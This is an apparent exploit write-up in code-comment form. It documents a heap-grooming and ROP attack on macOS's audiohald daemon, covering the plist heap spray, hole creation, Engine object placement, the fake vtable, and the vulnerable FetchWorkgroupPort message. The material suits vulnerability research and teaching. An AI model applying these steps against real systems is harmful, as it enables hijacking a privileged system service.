 * -----------------------------------------------------------------------------
 * A.5 MESSAGE HEADER BITS - DETAILED BREAKDOWN
 * -----------------------------------------------------------------------------
 *
 * The msgh_bits field is complex. Here's the exact bit layout:
 *
 *   31                              0
 *   +--------+--------+--------+--------+
 *   | complex| voucher| local  | remote |
 *   +--------+--------+--------+--------+
 *       1       5        8        8      bits
 *
 * MACH_MSGH_BITS_SET(remote, local, voucher, complex) macro:
 *   - remote (bits 0-7): Disposition of remote (destination) port
 *   - local (bits 8-15): Disposition of local (reply) port
 *   - voucher (bits 16-20): Voucher port disposition
 *   - complex (bit 31): Set if message has descriptors
 *
 * PORT DISPOSITION VALUES:
 *
 *   MACH_MSG_TYPE_MOVE_RECEIVE (16):
 *     - Transfers receive right (only one can exist)
 *     - Sender loses the right after send
 *
 *   MACH_MSG_TYPE_MOVE_SEND (17):
 *     - Transfers send right
 *     - Sender loses one send right
 *
 *   MACH_MSG_TYPE_MOVE_SEND_ONCE (18):
 *     - Transfers send-once right
 *     - Right is consumed after one message
 *
 *   MACH_MSG_TYPE_COPY_SEND (19):
 *     - Copies send right (kernel creates new reference)
 *     - Sender keeps their send right
 *
 *   MACH_MSG_TYPE_MAKE_SEND (20):
 *     - Creates send right from receive right
 *     - Sender must hold receive right
 *
 *   MACH_MSG_TYPE_MAKE_SEND_ONCE (21):
 *     - Creates send-once right from receive right
 *
 * EXAMPLE FROM THIS EXPLOIT:
 *
 *   msg->header.msgh_bits = MACH_MSGH_BITS_SET(
 *       MACH_MSG_TYPE_COPY_SEND,       // We have send right to service_port
 *       MACH_MSG_TYPE_MAKE_SEND_ONCE,  // Create reply send-once from our port
 *       MACH_PORT_NULL,                // No voucher
 *       MACH_MSGH_BITS_COMPLEX         // We have OOL descriptors
 *   );
 *
 * -----------------------------------------------------------------------------
 * A.6 MESSAGE QUEUE OPERATIONS - ipc_mqueue
 * -----------------------------------------------------------------------------
 *
 * Each port has an associated message queue (ipc_mqueue):
 *
 *   struct ipc_mqueue {
 *       union {
 *           struct {
 *               struct ipc_kmsg_queue  messages;    // Linked list of messages
 *               mach_port_seqno_t      seqno;       // Sequence number
 *               mach_port_msgcount_t   msgcount;    // Message count
 *               mach_port_msgcount_t   qlimit;      // Queue limit
 *           } port;
 *           struct {
 *               struct waitq_set       setq;        // For port sets
 *           } pset;
 *       } data;
 *       struct waitq               waitq;           // Threads waiting
 *   };
 *
 * SEND PATH (ipc_mqueue_send):
 *
 *   1. Lock the port
 *   2. Check if queue is full (msgcount >= qlimit)
 *      - If full and no timeout: block on waitq
 *      - If full with timeout: return MACH_SEND_TIMED_OUT
 *   3. Enqueue message: ipc_kmsg_enqueue(&port->messages, kmsg)
 *   4. Increment msgcount
 *   5. Wake any threads waiting to receive: waitq_wakeup_one()
 *   6. Unlock port
 *
 * RECEIVE PATH (ipc_mqueue_receive):
 *
 *   1. Lock the port
 *   2. Check if messages available (msgcount > 0)
 *      - If empty and no timeout: block on waitq
 *      - If empty with timeout: return MACH_RCV_TIMED_OUT
 *   3. Dequeue message: kmsg = ipc_kmsg_dequeue(&port->messages)
 *   4. Decrement msgcount
 *   5. Wake any threads waiting to send (if queue was full)
 *   6. Unlock port
 *   7. Copy message out to userspace: ipc_kmsg_copyout()
 *
 * AUDIOHALD'S RECEIVE LOOP:
 *
 *   audiohald sits in a loop calling mach_msg() with MACH_RCV_MSG.
 *   When our message arrives, audiohald's thread wakes up and processes it.
 *   The msgh_id field tells audiohald which handler function to call.
 *
 * =============================================================================
 * =============================================================================
 * SECTION B: HEAP GROOMING - THEORY AND PRACTICE
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * B.1 WHAT IS HEAP GROOMING?
 * -----------------------------------------------------------------------------
 *
 * Heap grooming (also called heap feng shui or heap shaping) is the technique
 * of manipulating a process's heap layout to achieve a predictable state
 * for exploitation.
 *
 * GOALS OF HEAP GROOMING:
 *
 *   1. FILL THE HEAP: Exhaust existing free chunks to force allocator
 *      to request new memory from the OS, creating a "clean slate"
 *
 *   2. PLACE CONTROLLED DATA: Fill heap regions with attacker-controlled
 *      data (our ROP payload) at predictable offsets
 *
 *   3. CREATE HOLES: Free specific allocations to create "holes" of
 *      known sizes at known positions
 *
 *   4. RECLAIM HOLES: Trigger allocations (like object creation) that
 *      will reuse the holes, placing objects where we want them
 *
 * WHY IT WORKS:
 *
 *   Modern allocators (like libmalloc on macOS) use bins/buckets for
 *   different allocation sizes. When you free memory, it goes into a
 *   freelist. When you allocate, you get memory from the freelist.
 *
 *   By controlling the sequence of allocs and frees, we can predict
 *   WHERE specific objects will be placed in memory.
 *
 * -----------------------------------------------------------------------------
 * B.2 macOS HEAP ALLOCATOR - libmalloc INTERNALS
 * -----------------------------------------------------------------------------
 *
 * macOS uses libmalloc (open source: https://opensource.apple.com/source/libmalloc/)
 *
 * ALLOCATOR ZONES:
 *
 *   DEFAULT ZONE (scalable_zone):
 *     - Main allocator for most allocations
 *     - Uses magazine-based design (per-CPU caches)
 *
 *   NANO ZONE (for small allocations, iOS/macOS):
 *     - Handles tiny allocations (< 256 bytes)
 *     - Uses bump-pointer allocation within "bands"
 *     - Very fast but predictable
 *
 * SCALABLE ZONE SIZE CLASSES (typical):
 *
 *   TINY allocations: 16, 32, 48, 64, 80, ... 1008 bytes
 *   SMALL allocations: 1024, 2048, ... 32KB
 *   LARGE allocations: > 32KB (backed by vm_allocate)
 *
 * KEY INSIGHT FOR THIS EXPLOIT:
 *
 *   Our payload is 1152 bytes. This falls in the SMALL allocation range.
 *   By spraying many 1152-byte allocations, we fill the SMALL freelist.
 *   When we free some, they go back to the SMALL freelist.
 *   When audiohald allocates an Engine object (~similar size), it gets
 *   memory from the SMALL freelist - potentially our freed slots!
 *
 * MAGAZINE-BASED ALLOCATION:
 *
 *   struct magazine_t {
 *       void *mag_last_free;           // Most recently freed block
 *       region_t *mag_last_region;     // Most recently used region
 *       // Per-CPU to avoid lock contention
 *   };
 *
 *   Allocation path:
 *     1. Check thread-local cache (mag_last_free)
 *     2. If empty, check magazine's freelist
 *     3. If empty, allocate from region
 *     4. If region full, create new region
 *
 * FREELIST STRUCTURE:
 *
 *   Freed blocks contain a pointer to the next free block:
 *
 *   +------------------+
 *   | next_free_ptr    |  <- First 8 bytes of freed block
 *   +------------------+
 *   | ... garbage ...  |  <- Rest of freed block (may contain old data!)
 *   +------------------+
 *
 *   This is important: freed memory ISN'T zeroed! Our payload data
 *   remains in the freed slots until overwritten.
 *
 * -----------------------------------------------------------------------------
 * B.3 HEAP SPRAY IMPLEMENTATION IN THIS EXPLOIT
 * -----------------------------------------------------------------------------
 *
 * THE SPRAY MECHANISM:
 *
 *   For each iteration:
 *     1. Create a MetaDevice (allocates device object in audiohald)
 *     2. Set property 'acom' with our binary plist
 *     3. Plist contains array of CFStrings, each holding ROP payload
 *
 * WHY USE PLISTS?
 *
 *   We can't directly allocate arbitrary memory in audiohald.
 *   But we CAN send property list data that audiohald will parse.
 *   When audiohald parses the plist:
 *     - CFPropertyListCreateWithData() is called
 *     - This creates CFString objects for each string in the plist
 *     - CFString allocates backing storage for the string contents
 *     - Our "string contents" are actually ROP payload bytes!
 *
 * THE SPRAY DATA PATH:
 *
 *   Exploit                    Kernel                     audiohald
 *   -------                    ------                     ---------
 *   1. Create binary plist
 *      with payload strings
 *
 *   2. vm_allocate() to
 *      create OOL buffer
 *
 *   3. mach_msg() sends
 *      message with OOL
 *                              4. Kernel creates ipc_kmsg
 *                              5. vm_map_copyin() copies
 *                                 our OOL data
 *                              6. Enqueues to audiohald's port
 *
 *                              7. audiohald receives msg
 *                              8. vm_map_copyout() maps
 *                                 OOL into audiohald         <-- OOL data now in audiohald's heap!
 *
 *                                                     9. Handler parses plist
 *                                                    10. CFString allocs for each
 *                                                        string in array
 *                                                        <- PAYLOAD IN HEAP!
 *
 * ALLOCATION SIZE CONTROL:
 *
 *   The ROP payload is 1152 bytes. When CFString creates storage:
 *
 *   CFStringCreateWithBytes(allocator, bytes, 1152, kCFStringEncodingUTF16LE, ...)
 *     -> __CFStrAllocateMutableContents()
 *       -> CFAllocatorAllocate(allocator, 1152 + overhead, 0)
 *         -> malloc(~1168 bytes)  // With string header overhead
 *
 *   So each CFString results in a ~1168 byte allocation.
 *   This consistently hits the same allocator bin.
 *
 * SPRAY QUANTITY:
 *
 *   --iterations N:  How many messages to send
 *   --allocs N:      How many strings per message (per plist)
 *
 *   Total spray allocations = iterations Ã— allocs
 *
 *   Example: --iterations 100 --allocs 50 = 5000 payload allocations
 *   At ~1168 bytes each = ~5.8 MB of controlled heap data
 *
 * -----------------------------------------------------------------------------
 * B.4 HOLE CREATION - THE FREEING PHASE
 * -----------------------------------------------------------------------------
 *
 * After spraying, we have:
 *
 *   +--------+--------+--------+--------+--------+--------+
 *   | META-1 | spray  | META-2 | spray  | META-3 | spray  | ...
 *   | DEVICE | payld  | DEVICE | payld  | DEVICE | payld  |
 *   +--------+--------+--------+--------+--------+--------+
 *
 *   Each MetaDevice has associated property storage containing our payloads.
 *
 * THE FREE MECHANISM:
 *
 *   To free allocations, we set the 'acom' property to a tiny value:
 *
 *   generateFreePlist() creates:
 *     <dict><key>arr</key><string>FREE</string></dict>
 *
 *   When audiohald processes this:
 *     1. Old property value (our large payload array) is released
 *     2. CFRelease() called on the old CFArray
 *     3. CFRelease() called on each CFString in the array
 *     4. Each CFString's backing storage is freed
 *     5. FREE SLOTS NOW EXIST IN THE HEAP!
 *
 * AFTER FREEING:
 *
 *   +--------+--------+--------+--------+--------+--------+
 *   | META-1 | spray  | META-2 | FREED  | META-3 | FREED  | ...
 *   | DEVICE | payld  | DEVICE | HOLES  | DEVICE | HOLES  |
 *   +--------+--------+--------+--------+--------+--------+
 *
 *   The FREED HOLES are ~1168 bytes each.
 *   The freelist now contains these slots.
 *   BUT: The freed memory still contains our payload data!
 *   (Remember: free() doesn't zero memory)
 *
 * -----------------------------------------------------------------------------
 * B.5 OBJECT PLACEMENT - RECLAIMING HOLES
 * -----------------------------------------------------------------------------
 *
 * Now we create Engine objects:
 *
 *   createEngineObjects() sends message 1010042 with selector 'mktp'
 *   audiohald creates a new Engine object:
 *     new EngineObject()  // C++ allocation
 *       -> operator new(sizeof(EngineObject))
 *         -> malloc(sizeof(EngineObject))
 *           -> Allocator checks freelist for matching size
 *           -> May return one of our freed slots!
 *
 * CRITICAL INSIGHT:
 *
 *   If sizeof(EngineObject) is close to our spray allocation size (~1168),
 *   the Engine object WILL land in one of our freed slots.
 *
 *   The Engine object's vtable pointer and fields get written.
 *   BUT: Not all of the allocation is overwritten!
 *   Bytes beyond sizeof(EngineObject) still contain our payload.
 *
 * MEMORY LAYOUT AFTER OBJECT CREATION:
 *
 *   +------------------+------------------+
 *   | Engine Object    | RESIDUAL PAYLOAD |
 *   | vtable, fields   | from previous    |
 *   | (overwritten)    | CFString alloc   |
 *   +------------------+------------------+
 *   |<-- sizeof(Eng) ->|<-- remainder --->|
 *
 * =============================================================================
 * =============================================================================
 * SECTION C: ROP CHAIN MECHANICS - RETURN-ORIENTED PROGRAMMING
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * C.1 WHAT IS ROP?
 * -----------------------------------------------------------------------------
 *
 * Return-Oriented Programming is a code-reuse attack technique that:
 *   - Works despite non-executable heap (NX/DEP)
 *   - Works despite ASLR (with info leak)
 *   - Chains together "gadgets" - small code sequences ending in RET
 *
 * TRADITIONAL EXPLOIT (no NX):
 *   Stack: [shellcode][shellcode][shellcode]...
 *   Overwrite return address to point to shellcode
 *   CPU executes our shellcode directly
 *
 * ROP EXPLOIT (with NX):
 *   Stack: [gadget1_addr][gadget2_addr][gadget3_addr]...
 *   Each gadget is EXISTING CODE in the program/libraries
 *   Gadgets end with RET, which pops next address and jumps
 *   Chain of gadgets performs arbitrary computation
 *
 * GADGET EXAMPLE:
 *
 *   Gadget at 0x7fff12345678:
 *     pop rdi        ; Load value from stack into rdi
 *     ret            ; Jump to next gadget
 *
 *   Gadget at 0x7fff23456789:
 *     pop rsi        ; Load value from stack into rsi
 *     ret            ; Jump to next gadget
 *
 *   Gadget at 0x7fff34567890:
 *     call [rax]     ; Call function pointer in rax
 *     ret
 *
 *   Stack layout:
 *     [0x7fff12345678]  <- First gadget: pop rdi; ret
 *     [0x00000000002f]  <- Value for rdi ("/")
 *     [0x7fff23456789]  <- Second gadget: pop rsi; ret
 *     [0x0000000000ff]  <- Value for rsi
 *     ...
 *
 * -----------------------------------------------------------------------------
 * C.2 arm64 (Apple Silicon) SPECIFICS
 * -----------------------------------------------------------------------------
 *
 * On arm64 (M1/M2/M3), ROP is slightly different:
 *
 * KEY DIFFERENCES FROM x86_64:
 *
 *   1. Link Register (LR/x30):
 *      - Function return address stored in LR, not on stack
 *      - RET instruction jumps to LR
 *      - To chain, need gadgets that load LR from memory
 *
 *   2. Stack Pointer:
 *      - SP must be 16-byte aligned
 *      - Misaligned SP causes alignment fault
 *
 *   3. PAC (Pointer Authentication):
 *      - On newer chips, return addresses are signed
 *      - PAC adds cryptographic signature to pointers
 *      - Invalid signature = crash
 *      - Bypassing PAC requires additional techniques
 *
 * arm64 ROP GADGET PATTERNS:
 *
 *   Load LR from stack and return:
 *     ldp x29, x30, [sp], #0x10   ; Load fp and lr from stack
 *     ret                         ; Return via lr
 *
 *   Call through register:
 *     blr x8                      ; Branch-link to x8, sets lr
 *     ...
 *
 *   Load register from stack:
 *     ldr x0, [sp, #0x20]         ; Load x0 from stack offset
 *     ...
 *
 * -----------------------------------------------------------------------------
 * C.3 JOP - JUMP-ORIENTED PROGRAMMING (Alternative)
 * -----------------------------------------------------------------------------
 *
 * JOP uses indirect jumps instead of returns:
 *
 *   Dispatcher gadget:
 *     ldr x8, [x19]        ; Load next gadget address
 *     add x19, x19, #8     ; Advance gadget pointer
 *     br x8                ; Jump to gadget
 *
 *   Functional gadgets end with jump back to dispatcher
 *
 * ADVANTAGE: Doesn't use return addresses (may bypass some defenses)
 * DISADVANTAGE: Need to find/control dispatcher and gadget table
 *
 * -----------------------------------------------------------------------------
 * C.4 THE PAYLOAD FILE - rop_payload.bin
 * -----------------------------------------------------------------------------
 *
 * This exploit loads the ROP chain from "rop_payload.bin" (1152 bytes).
 *
 * EXPECTED STRUCTURE:
 *
 *   Offset 0x000: [Fake object vtable pointer / first gadget]
 *   Offset 0x008: [Second gadget / data]
 *   Offset 0x010: [Third gadget / data]
 *   ...
 *   Offset 0x47F: [End of 1152 bytes]
 *
 * WHY 1152 BYTES?
 *
 *   This size is chosen to match the target allocation bin.
 *   The Engine object's allocation size is around this range.
 *   Matching sizes = higher probability of landing in our slot.
 *
 * PAYLOAD CONTENT DEPENDS ON:
 *
 *   1. Target macOS version (affects library addresses)
 *   2. ASLR slide (may need info leak to calculate)
 *   3. Desired post-exploitation action
 *   4. Whether PAC is enabled and how to bypass
 *
 * GENERIC PAYLOAD STRUCTURE:
 *
 *   +-------------------+
 *   | Fake vtable ptr   |  <- Points to controlled memory / gadget
 *   +-------------------+
 *   | Field mimicking   |
 *   | Engine object     |
 *   +-------------------+
 *   | ROP gadget chain  |
 *   | addresses         |
 *   +-------------------+
 *   | Data values for   |
 *   | gadgets to use    |
 *   +-------------------+
 *
 * -----------------------------------------------------------------------------
 * C.5 CONTROL FLOW HIJACK - HOW ROP GETS EXECUTED
 * -----------------------------------------------------------------------------
 *
 * THE VULNERABLE CODE PATH:
 *
 *   When trigger_vulnerability() sends message 1010059:
 *
 *   audiohald receives message:
 *     -> Dispatch to XIOContext_FetchWorkgroupPort handler
 *       -> Handler looks up object by ID
 *       -> Calls virtual method on the object
 *
 *   VULNERABLE SCENARIO:
 *
 *     1. Object pointer points to our controlled memory
 *        (due to heap grooming / use-after-free / type confusion)
 *
 *     2. Virtual method call: object->someMethod()
 *        Compiles to:
 *          ldr x8, [x0]         ; Load vtable from object
 *          ldr x8, [x8, #offset] ; Load function pointer
 *          blr x8               ; Call function
 *
 *     3. If x0 points to our payload:
 *          - [x0] = our fake vtable pointer
 *          - [fake_vtable + offset] = our first gadget
 *          - blr x8 jumps to our gadget!
 *
 * TRIGGERING ROP EXECUTION:
 *
 *   HEAP LAYOUT BEFORE TRIGGER:
 *
 *   +---------------------------+
 *   | Engine Object (corrupted) |
 *   |   vtable ptr -> [payload] |  <- Points to our controlled data
 *   |   other fields            |
 *   +---------------------------+
 *   | Our ROP payload           |
 *   |   fake_vtable[0] = gad1   |  <- First gadget address
 *   |   fake_vtable[1] = gad2   |
 *   |   ...                     |
 *   +---------------------------+
 *
 *   EXECUTION FLOW:
 *
 *   1. audiohald: obj->fetchWorkgroupPort()
 *   2. CPU: ldr x8, [x0]        -> loads fake vtable address
 *   3. CPU: ldr x8, [x8, #off]  -> loads gadget1 address
 *   4. CPU: blr x8              -> jumps to gadget1
 *   5. Gadget1 executes, ends with ret/br
 *   6. CPU: jumps to gadget2
 *   ... ROP chain executes ...
 *
 * =============================================================================
 * =============================================================================
 * SECTION D: BINARY PLIST FORMAT AND CFSTRING INTERNALS
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * D.1 BINARY PLIST FORMAT (bplist00)
 * -----------------------------------------------------------------------------
 *
 * Binary plists are Apple's efficient serialization format.
 * They can represent: dict, array, string, data, number, date, bool.
 *
 * FILE STRUCTURE:
 *
 *   +-------------------+
 *   | Magic: "bplist00" |  8 bytes
 *   +-------------------+
 *   | Object data       |  Variable
 *   | (serialized       |
 *   |  objects)         |
 *   +-------------------+
 *   | Offset table      |  Array of object offsets
 *   +-------------------+
 *   | Trailer           |  32 bytes
 *   +-------------------+
 *
 * TRAILER STRUCTURE (last 32 bytes):
 *
 *   Byte 0-5:   Unused (padding)
 *   Byte 6:     Sort version
 *   Byte 7:     Offset integer size (bytes per offset)
 *   Byte 8:     Object reference size
 *   Byte 9-16:  Number of objects (64-bit BE)
 *   Byte 17-24: Root object index (64-bit BE)
 *   Byte 25-32: Offset table offset (64-bit BE)
 *
 * OBJECT ENCODING:
 *
 *   Each object starts with a type marker byte:
 *
 *   0x00:       null
 *   0x08:       false
 *   0x09:       true
 *   0x1N:       int (N+1 bytes, big-endian)
 *   0x2N:       real (N=2 for float, N=3 for double)
 *   0x3N:       date (N=3, 8-byte float since 2001-01-01)
 *   0x4N:       data (N bytes follow, or extended length)
 *   0x5N:       ASCII string (N bytes)
 *   0x6N:       UTF-16BE string (N 2-byte chars)
 *   0xAN:       array (N objects)
 *   0xDN:       dict (N key-value pairs)
 *
 * STRING ENCODING IN BINARY PLIST:
 *
 *   UTF-16 strings (0x6N marker) store big-endian UTF-16.
 *   When CFPropertyListCreateWithData() parses this:
 *     - Reads UTF-16BE code units
 *     - Creates CFString with CFStringCreateWithBytes()
 *     - String data is stored in native byte order (little-endian on Intel/ARM)
 *
 * OUR EXPLOITATION:
 *
 *   We use CFStringCreateWithBytes() with kCFStringEncodingUTF16LE
 *   to create strings from our raw payload bytes.
 *   CFPropertyListCreateData() then serializes to binary plist.
 *   When audiohald parses, it recreates the CFString,
 *   and the backing storage contains our exact bytes!
 *
 * -----------------------------------------------------------------------------
 * D.2 CFSTRING INTERNAL STRUCTURE
 * -----------------------------------------------------------------------------
 *
 * CFString is a "toll-free bridged" type with NSString.
 * Internally, it's a struct with multiple possible storage representations:
 *
 * CFSTRING VARIANTS:
 *
 *   1. INLINE STRING (small strings):
 *      - Characters stored directly in CFString struct
 *      - No separate allocation
 *      - Limited to ~12 characters on 64-bit
 *
 *   2. EXTERNAL BUFFER (our case):
 *      - Characters stored in separate heap allocation
 *      - CFString has pointer to buffer
 *      - Used for larger strings
 *
 *   3. CONSTANT STRING:
 *      - Points to constant data (e.g., from __DATA segment)
 *      - No heap allocation
 *
 * CFSTRING STRUCT (simplified, from CFString.c):
 *
 *   struct __CFString {
 *       CFRuntimeBase _base;           // 16 bytes: isa, flags
 *       union {
 *           struct {
 *               void *buffer;           // Pointer to character data
 *               CFIndex length;         // Character count
 *               CFIndex capacity;       // Buffer capacity
 *               CFAllocatorRef alloc;   // Allocator for buffer
 *           } externalBuffer;
 *           struct {
 *               uint8_t inline_contents[12];  // Inline storage
 *               uint8_t length;
 *           } inlineBuffer;
 *       };
 *   };
 *
 * KEY POINTS:
 *
 *   - When we create a 1152-byte CFString, it's EXTERNAL
 *   - CFString allocates a ~1152 byte buffer for the character data
 *   - THIS ALLOCATION is what lands in audiohald's heap
 *   - The CFString object itself is separate (smaller allocation)
 *
 * MEMORY LAYOUT:
 *
 *   +------------------+         +------------------+
 *   | CFString struct  |  -----> | Character buffer |
 *   | isa ptr          |         | (1152 bytes)     |
 *   | flags            |         | OUR PAYLOAD!     |
 *   | buffer ptr   ----+         +------------------+
 *   | length           |
 *   +------------------+
 *       (~48 bytes)                 (~1168 bytes with header)
 *
 * -----------------------------------------------------------------------------
 * D.3 WHY UTF-16 ENCODING?
 * -----------------------------------------------------------------------------
 *
 * We interpret payload bytes as UTF-16LE code units:
 *
 *   for (i = 0; i < raw_bytes.size(); i += 2) {
 *       uint16_t val;
 *       memcpy(&val, &raw_bytes[i], 2);
 *       payload_utf16.push_back(val);
 *   }
 *
 * REASONS:
 *
 *   1. BYTE PRESERVATION:
 *      - UTF-16 uses 2-byte code units
 *      - Most 16-bit values are valid UTF-16
 *      - Surrogates (0xD800-0xDFFF) need special handling
 *      - But most arbitrary bytes survive round-trip
 *
 *   2. NO NULL TERMINATION:
 *      - CFString can contain embedded nulls
 *      - Unlike C strings, length is explicit
 *      - Our payload can have 0x00 bytes
 *
 *   3. EFFICIENT STORAGE:
 *      - UTF-16 strings are stored as-is in memory
 *      - No expansion (unlike UTF-8 for high bytes)
 *
 * POTENTIAL ISSUES:
 *
 *   - Invalid surrogate pairs may be rejected or modified
 *   - Some byte sequences may be normalized
 *   - Solution: Carefully craft payload to avoid problematic values
 *     Or use <data> base64 encoding instead of <string>
 *
 * ALTERNATIVE: BINARY DATA IN PLIST:
 *
 *   Instead of strings, we could use:
 *     <data>base64encodedpayload</data>
 *
 *   This would create CFData instead of CFString.
 *   CFData stores raw bytes without interpretation.
 *   BUT: CFData allocation may hit different size class.
 *   Current approach uses CFString for specific allocation size.
 *
 * -----------------------------------------------------------------------------
 * D.4 CFARRAY STORAGE
 * -----------------------------------------------------------------------------
 *
 * We wrap our strings in a CFArray:
 *
 *   CFMutableArrayRef cfArray = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);
 *   for (i = 0; i < allocs_per_iteration; i++) {
 *       CFArrayAppendValue(cfArray, strEntry);
 *   }
 *
 * CFARRAY INTERNALS:
 *
 *   struct __CFArray {
 *       CFRuntimeBase _base;
 *       CFIndex _count;              // Number of elements
 *       CFIndex _capacity;           // Allocated capacity
 *       void **_values;              // Array of object pointers
 *   };
 *
 * WHEN AUDIOHALD PARSES:
 *
 *   1. CFPropertyListCreateWithData() called on binary plist
 *   2. Parser encounters array marker (0xAN)
 *   3. Creates CFArray with N elements
 *   4. For each element:
 *      - If string: CFStringCreateWithBytes() called
 *      - New CFString created with backing buffer
 *      - Buffer allocated from audiohald's heap!
 *   5. CFArray holds references to all CFStrings
 *
 * RESULT:
 *
 *   allocs_per_iteration separate heap allocations
 *   Each allocation is ~1168 bytes
 *   Each allocation contains our payload bytes
 *
 * =============================================================================
 * =============================================================================
 * SECTION E: AUDIOHALD OBJECT MODEL AND MESSAGE DISPATCH
 * =============================================================================
 * =============================================================================
 *
 * -----------------------------------------------------------------------------
 * E.1 AUDIOHALD ARCHITECTURE
 * -----------------------------------------------------------------------------
 *
 * audiohald (Audio HAL Daemon) is the userspace component of CoreAudio.
 * It manages audio devices, streams, and provides the HAL API to apps.
 *
 * PROCESS HIERARCHY:
 *
 *   launchd (PID 1)
 *       |
 *       +-- audiohald (Audio HAL Daemon)
 *       |      |
 *       |      +-- Per-client threads
 *       |      +-- Device management threads
 *       |
 *       +-- coreaudiod (Core Audio Daemon) [separate service]
 *
 * SERVICE REGISTRATION:
 *
 *   audiohald registers "com.apple.audio.audiohald" with launchd.
 *   bootstrap_look_up() returns a send right to audiohald's service port.
 *
 * -----------------------------------------------------------------------------
 * E.2 MESSAGE DISPATCH IN AUDIOHALD
 * -----------------------------------------------------------------------------
 *
 * audiohald uses MIG (Mach Interface Generator) for message handling.
 *
 * MIG BASICS:
 *
 *   MIG takes a .defs file describing messages:
 *
 *   routine XSystem_Open(
 *       server_port: mach_port_t;
 *       notification_port: mach_port_move_send_t;
 *       ...
 *   );
 *
 *   MIG generates:
 *     - Client stub (for calling the routine)
 *     - Server stub (for receiving and dispatching)
 *     - Dispatch table mapping message IDs to handlers
 *
 * DISPATCH TABLE STRUCTURE:
 *
 *   typedef struct {
 *       mig_stub_routine_t stub;    // Handler function
 *       mach_msg_size_t size;       // Expected message size
 *   } mig_routine_descriptor;
 *
 *   mig_routine_descriptor audiohald_routines[] = {
 *       { _XSystem_Open,        sizeof(XSystem_Open_msg)        }, // 1010000
 *       { _XSystem_Close,       sizeof(XSystem_Close_msg)       }, // 1010001
 *       { _XSystem_GetObjectInfo, sizeof(...)                   }, // 1010002
 *       ...
 *       { _XIOContext_FetchWorkgroupPort, sizeof(...)           }, // 1010059
 *   };
 *
 * DISPATCH FLOW:
 *
 *   1. audiohald calls mach_msg() to receive
 *   2. Message arrives with msgh_id = 1010059
 *   3. Dispatcher: index = msgh_id - 1010000
 *   4. handler = audiohald_routines[index].stub
 *   5. handler(request_msg, reply_msg) called
 *   6. Handler does actual work
 *   7. Reply sent back (if requested)
 *
 * -----------------------------------------------------------------------------
 * E.3 OBJECT ID SYSTEM
 * -----------------------------------------------------------------------------
 *
 * audiohald tracks objects using 32-bit IDs.
 *
 * OBJECT TYPES (4-char codes, stored reversed):
 *
 *   "ngnejboa" = "aobjenng" reversed = Engine object
 *   "ggaaveda" = "adevaagg" reversed = MetaDevice (aggregate device)
 *   "mertsjba" = "abjstrm?" reversed = Stream object
 *   etc.
 *
 * OBJECT TABLE:
 *
 *   audiohald maintains a table: object_id -> object_ptr
 *
 *   struct ObjectTable {
 *       std::unordered_map<uint32_t, HALObject*> objects;
 *       uint32_t next_id;
 *   };
 *
 * OBJECT LIFECYCLE:
 *
 *   1. Creation: ID assigned, object allocated, added to table
 *   2. Usage: Messages reference object by ID
 *   3. Destruction: Object freed, removed from table
 *
 * OBJECT LOOKUP:
 *
 *   When message handler receives object_id:
 *
 *   HALObject* obj = object_table.lookup(object_id);
 *   if (!obj) return kAudioHardwareBadObjectError;
 *   obj->doSomething();  // Virtual call!
 *
 * -----------------------------------------------------------------------------
 * E.4 KEY MESSAGE HANDLERS
 * -----------------------------------------------------------------------------
 *
 * MESSAGE 1010000 - XSystem_Open:
 *
 *   Purpose: Initialize client session
 *   Input: notification_port (send right)
 *   Action:
 *     - Creates client state structure
 *     - Stores notification port for async events
 *     - Required before other operations
 *
 * MESSAGE 1010002 - XSystem_GetObjectInfo:
 *
 *   Purpose: Query object type
 *   Input: object_id
 *   Output: 8-byte type string (e.g., "ngnejboa")
 *   Action:
 *     - Looks up object in table
 *     - Returns object's type identifier
 *   Our use: Enumerate objects, find Engine objects
 *
 * MESSAGE 1010005 - XSystem_CreateMetaDevice:
 *
 *   Purpose: Create aggregate audio device
 *   Input: OOL plist with device config
 *   Action:
 *     - Parses plist (name, UID, subdevices)
 *     - Allocates MetaDevice object
 *     - Assigns new object ID
 *   Our use: Heap grooming (device creation = allocation)
 *
 * MESSAGE 1010034 - XObject_SetPropertyData:
 *
 *   Purpose: Set property on an object
 *   Input: object_id, selector, scope, element, OOL plist data
 *   Action:
 *     - Looks up object
 *     - Calls obj->SetPropertyData(selector, scope, element, data)
 *     - Handler stores data (ALLOCATES in heap!)
 *   Our use:
 *     - Selector 'acom': Used to spray/free allocations
 *     - Data stored as property = controlled allocation
 *
 * MESSAGE 1010042 - XObject_GetPropertyData:
 *
 *   Purpose: Get property from an object
 *   Input: object_id, selector, scope, element, OOL plist
 *   Special behavior for selector 'mktp' (make tap):
 *     - CREATES a new Engine/Tap object!
 *     - Allocates Engine object in heap
 *   Our use: Create vulnerable Engine objects
 *
 * MESSAGE 1010059 - XIOContext_FetchWorkgroupPort:
 *
 *   Purpose: Get workgroup port for I/O context
 *   Input: object_id
 *   Action:
 *     - Looks up object
 *     - Calls obj->FetchWorkgroupPort()
 *   VULNERABILITY:
 *     - Under certain conditions, object pointer invalid
 *     - May dereference corrupted/controlled memory
 *     - Virtual call on corrupted object = controlled PC
 *
 * -----------------------------------------------------------------------------
 * E.5 ENGINE OBJECT STRUCTURE
 * -----------------------------------------------------------------------------
 *
 * Engine objects are C++ objects inheriting from HALObject base class.
 *
 * TYPICAL C++ OBJECT LAYOUT:
 *
 *   struct EngineObject {
 *       void* vtable;              // Offset 0x00: Virtual table pointer
 *       uint32_t object_id;        // Offset 0x08: Object ID
 *       uint32_t type;             // Offset 0x0C: Type code
 *       // ... more fields ...
 *       IOContext* io_context;     // Some offset: I/O context pointer
 *       // ... more fields ...
 *   };
 *
 * VTABLE STRUCTURE:
 *
 *   vtable for EngineObject:
 *     [0]: destructor
 *     [1]: GetObjectID
 *     [2]: GetType
 *     [3]: SetPropertyData
 *     [4]: GetPropertyData
 *     ...
 *     [N]: FetchWorkgroupPort    // THE VULNERABLE METHOD
 *
 * VIRTUAL CALL MECHANISM:
 *
 *   obj->FetchWorkgroupPort() compiles to:
 *
 *   ldr x8, [x0]          // Load vtable pointer from object
 *   ldr x8, [x8, #N*8]    // Load function pointer from vtable
 *   blr x8                // Call the function
 *
 * EXPLOITATION:
 *
 *   If we control memory at x0 (object pointer):
 *     - [x0] can be fake vtable address (pointing to our data)
 *     - [fake_vtable + N*8] can be our first gadget
